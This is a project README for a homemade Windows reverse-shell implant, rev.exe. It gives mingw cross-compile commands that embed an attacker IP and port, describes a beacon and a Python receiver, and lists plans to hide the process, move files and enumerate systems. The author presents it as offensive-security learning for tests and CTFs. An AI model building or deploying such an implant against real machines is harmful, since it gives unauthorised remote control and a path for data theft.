Original repo: https://github.com/thosearetheguise/rev


This code was created by following on from https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/. I've taken some liberties and added some stuff like:

Really crappy randomness for the beacon and a timeout after X beacons to stop the thing running if something goes wrong. Also, I haven't tested that because I wasn't patient enough. 

To compile on Kali



```bash
apt install mingw-w64-i686-dev
apt install mingw-w64
i686-w64-mingw32-g++ rev.c -o build/rev.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -DIP=\"10.10.10.10\" -DPORT=8080
```
I've moved the IP address out of the source file into the -D switch. 

Or use the makefile (you still need to install the require stuff from above.)

```bash
make ATTK_HOST=10.10.10.10 ATTK_PORT=8080
```

To compile in windows install visual studio community and hunt down cl.exe, and the .bat files to set up the env vars (google around, I can't be bothered...)

For the python reciever (which as I learn stuff may become more than a random curiosity):

```bash
 apt-get install python3-venv
 python3 -m venv env
 source env/bin/activate
 ```

 Because I like virtual envs. If there's a requirements.txt get that running with pip -r requirements.txt.

 Bear in mind that at the moment recieve.py literally does nothing except what netcat would do... I just wanted to see if I could get something to work.

 TODO
  - [ ] Find a way to make the reciever handle multiple reverse shells.
  - [ ] Update rev.exe to support various options, with a reverse shell justing being one. This includes system enumeration, moving files to the box, sending files back, command exec, etc...
  - [ ] Update the functionality in rev.c so it can be compiled to time out and display a cmd.exe window (while debugging/building so it's easy to kill), and hide/never time out when using in a test or CTF.
